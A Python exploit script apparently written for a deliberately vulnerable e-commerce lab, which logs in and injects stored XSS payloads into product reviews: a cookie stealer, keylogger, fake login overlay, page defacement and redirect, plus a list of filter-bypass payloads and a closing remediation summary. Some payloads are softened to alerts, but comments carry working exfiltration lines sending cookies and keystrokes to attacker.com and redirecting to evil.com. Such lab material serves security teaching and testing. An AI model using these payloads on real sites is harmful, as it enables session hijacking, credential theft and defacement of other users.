#!/usr/bin/env python3
"""
Cross-Site Scripting (XSS) Exploit for VulnHub E-commerce
Author: Chris Cortes
Target: Product review functionality
Impact: Session hijacking, credential theft, phishing, defacement

This script demonstrates stored XSS in product reviews.
User input is stored in the database and rendered without encoding,
allowing JavaScript execution in other users' browsers.

OWASP Top 10 2021: A03 - Injection
CWE-79: Cross-Site Scripting
"""

import requests
import sys
from urllib.parse import urljoin
import time

class XSSExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
    def banner(self):
        """Display exploit banner"""
        print("=" * 60)
        print("Cross-Site Scripting (XSS) Exploit - VulnHub E-commerce")
        print("Target: Product Review Functionality")
        print("=" * 60)
        print()
    
    def login(self, username, password):
        """Login to the application"""
        print(f"[*] Logging in as {username}...")
        
        login_url = urljoin(self.base_url, '/login')
        
        data = {
            'username': username,
            'password': password
        }
        
        try:
            response = self.session.post(login_url, data=data, allow_redirects=True)
            
            if response.status_code == 200 and username in response.text:
                print(f"[+] Successfully logged in as {username}")
                return True
            else:
                print(f"[-] Login failed for {username}")
                return False
                
        except Exception as e:
            print(f"[-] Error during login: {e}")
            return False
    
    def test_basic_xss(self, product_id=1):
        """Test basic XSS with alert() payload"""
        print("\n[*] Testing basic XSS with alert() payload...")
        
        payload = "<script>alert('XSS by Chris')</script>"
        
        return self.inject_xss_payload(product_id, payload, "Basic Alert Test")
    
    def inject_cookie_stealer(self, product_id=1):
        """Inject cookie-stealing XSS payload"""
        print("\n[*] Injecting cookie-stealing payload...")
        print("[*] In real attack, this would send cookies to attacker server")
        
        # Cookie stealer payload (demonstration only)
        # In real scenario: document.location='http://attacker.com/steal?c='+document.cookie
        payload = """<script>
            // Cookie Stealer Payload
            var cookies = document.cookie;
            console.log('Stolen cookies:', cookies);
            alert('Cookies stolen! Check console.\\n' + cookies);
        </script>"""
        
        return self.inject_xss_payload(product_id, payload, "Cookie Stealer")
    
    def inject_keylogger(self, product_id=2):
        """Inject keylogger XSS payload"""
        print("\n[*] Injecting keylogger payload...")
        print("[*] Captures all keystrokes on the page")
        
        payload = """<script>
            // Keylogger Payload
            document.addEventListener('keypress', function(e) {
                var key = e.key || String.fromCharCode(e.which);
                console.log('Key pressed:', key);
                // In real attack: send to attacker server
                // fetch('http://attacker.com/log?k=' + key);
            });
            alert('Keylogger active! All keystrokes will be logged.');
        </script>"""
        
        return self.inject_xss_payload(product_id, payload, "Keylogger")
    
    def inject_phishing_form(self, product_id=3):
        """Inject fake login form overlay"""
        print("\n[*] Injecting phishing overlay...")
        print("[*] Creates fake login form to steal credentials")
        
        payload = """<script>
            // Phishing Overlay
            var overlay = document.createElement('div');
            overlay.style = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;align-items:center;justify-content:center';
            overlay.innerHTML = '<div style="background:white;padding:40px;border-radius:10px;max-width:400px"><h2>Session Expired</h2><p>Please login again:</p><input type="text" placeholder="Username" id="phish_user" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ccc"><input type="password" placeholder="Password" id="phish_pass" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ccc"><button onclick="alert(\\'Credentials captured!\\\\nUser: \\' + document.getElementById(\\'phish_user\\').value + \\'\\\\nPass: \\' + document.getElementById(\\'phish_pass\\').value); document.body.removeChild(document.body.firstChild);" style="width:100%;padding:10px;background:#3b82f6;color:white;border:none;border-radius:5px;cursor:pointer">Login</button></div>';
            document.body.insertBefore(overlay, document.body.firstChild);
        </script>"""
        
        return self.inject_xss_payload(product_id, payload, "Phishing Form")
    
    def inject_defacement(self, product_id=1):
        """Inject page defacement payload"""
        print("\n[*] Injecting page defacement...")
        
        payload = """<script>
            // Page Defacement
            setTimeout(function() {
                document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:linear-gradient(45deg,#f00,#00f);color:white;font-size:48px;font-weight:bold;text-align:center;flex-direction:column"><div>HACKED BY CHRIS</div><div style="font-size:24px;margin-top:20px">XSS Vulnerability Exploited</div></div>';
            }, 2000);
        </script>"""
        
        return self.inject_xss_payload(product_id, payload, "Defacement")
    
    def inject_redirect(self, product_id=2):
        """Inject redirect payload"""
        print("\n[*] Injecting redirect payload...")
        
        payload = """<script>
            // Redirect Attack
            alert('Redirecting to attacker site...');
            // In real attack: window.location = 'http://evil.com/fake-login';
            console.log('Would redirect to: http://evil.com');
        </script>"""
        
        return self.inject_xss_payload(product_id, payload, "Redirect")
    
    def inject_xss_payload(self, product_id, payload, description):
        """Helper function to inject XSS payload into product review"""
        review_url = urljoin(self.base_url, f'/product/{product_id}/review')
        
        data = {
            'rating': 5,
            'comment': payload
        }
        
        try:
            response = self.session.post(review_url, data=data, allow_redirects=True)
            
            if response.status_code == 200:
                print(f"[+] {description} payload injected successfully!")
                print(f"[+] Payload stored in product ID {product_id}")
                print(f"[+] View at: {self.base_url}/product/{product_id}")
                return True
            else:
                print(f"[-] Failed to inject payload (status: {response.status_code})")
                return False
                
        except Exception as e:
            print(f"[-] Error injecting payload: {e}")
            return False
    
    def demonstrate_dom_xss(self):
        """Demonstrate DOM-based XSS (if implemented)"""
        print("\n[*] DOM-based XSS demonstration...")
        print("[*] Payload executes via client-side JavaScript")
        print("[*] Example: URL fragment exploitation")
        print(f"[*] {self.base_url}/products#<img src=x onerror=alert('DOM-XSS')>")
        print()
    
    def test_xss_filters(self):
        """Test various XSS filter bypass techniques"""
        print("\n[*] Testing XSS filter bypass techniques...")
        
        bypasses = [
            ("<script>alert('XSS')</script>", "Basic script tag"),
            ("<img src=x onerror=alert('XSS')>", "Image onerror"),
            ("<svg onload=alert('XSS')>", "SVG onload"),
            ("<iframe src='javascript:alert(1)'>", "IFrame JavaScript protocol"),
            ("<body onload=alert('XSS')>", "Body onload"),
            ("<input onfocus=alert('XSS') autofocus>", "Input onfocus"),
            ("<marquee onstart=alert('XSS')>", "Marquee onstart"),
            ("<details open ontoggle=alert('XSS')>", "Details ontoggle"),
        ]
        
        print("\n[+] XSS Filter Bypass Techniques:")
        for payload, description in bypasses:
            print(f"  {description:30} : {payload}")
        print()
    
    def generate_xss_report(self):
        """Generate exploitation report"""
        print("\n" + "=" * 60)
        print("XSS Exploitation Summary")
        print("=" * 60)
        print()
        print("Vulnerability Details:")
        print("  Type: Stored (Persistent) XSS")
        print("  Location: Product review comments")
        print("  CWE: CWE-79 (Cross-Site Scripting)")
        print("  CVSS Score: 7.1 (High)")
        print()
        print("Attack Vectors Demonstrated:")
        print("  ✓ Session hijacking (cookie theft)")
        print("  ✓ Keylogging")
        print("  ✓ Phishing (fake login forms)")
        print("  ✓ Page defacement")
        print("  ✓ Malicious redirects")
        print()
        print("Impact:")
        print("  - Account takeover via session theft")
        print("  - Credential harvesting through phishing")
        print("  - Malware distribution")
        print("  - Reputation damage")
        print()
        print("Remediation:")
        print("  1. Output encoding/escaping")
        print("     - Use Jinja2's default escaping (remove |safe filter)")
        print("     - HTML entity encoding for user input")
        print()
        print("  2. Input validation")
        print("     - Whitelist allowed characters")
        print("     - Sanitize HTML tags")
        print()
        print("  3. Content Security Policy (CSP)")
        print("     - Restrict script sources")
        print("     - Disable inline scripts")
        print()
        print("  4. HTTPOnly cookies")
        print("     - Prevent JavaScript access to session cookies")
        print()
        print("  5. Security headers")
        print("     - X-XSS-Protection")
        print("     - X-Content-Type-Options")
        print("=" * 60)
    
    def run(self):
        """Execute the complete exploitation chain"""
        self.banner()
        
        # Step 1: Login
        if not self.login('user', 'password'):
            print("[-] Failed to login, aborting")
            return
        
        print("\n[*] Beginning XSS payload injection...")
        print("[*] Target: Product reviews (stored XSS)")
        print()
        
        # Step 2: Inject various XSS payloads
        self.test_basic_xss(product_id=1)
        time.sleep(0.5)
        
        self.inject_cookie_stealer(product_id=1)
        time.sleep(0.5)
        
        self.inject_keylogger(product_id=2)
        time.sleep(0.5)
        
        self.inject_phishing_form(product_id=3)
        time.sleep(0.5)
        
        self.inject_defacement(product_id=1)
        time.sleep(0.5)
        
        self.inject_redirect(product_id=2)
        
        # Step 3: Additional techniques
        self.demonstrate_dom_xss()
        self.test_xss_filters()
        
        # Step 4: Generate report
        self.generate_xss_report()
        
        print("\n[+] Visit the product pages to see payloads execute!")
        print(f"[+] {self.base_url}/product/1")
        print(f"[+] {self.base_url}/product/2")
        print(f"[+] {self.base_url}/product/3")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
    
    base_url = sys.argv[1]
    
    # Create and run exploit
    exploit = XSSExploit(base_url)
    exploit.run()


if __name__ == "__main__":
    main()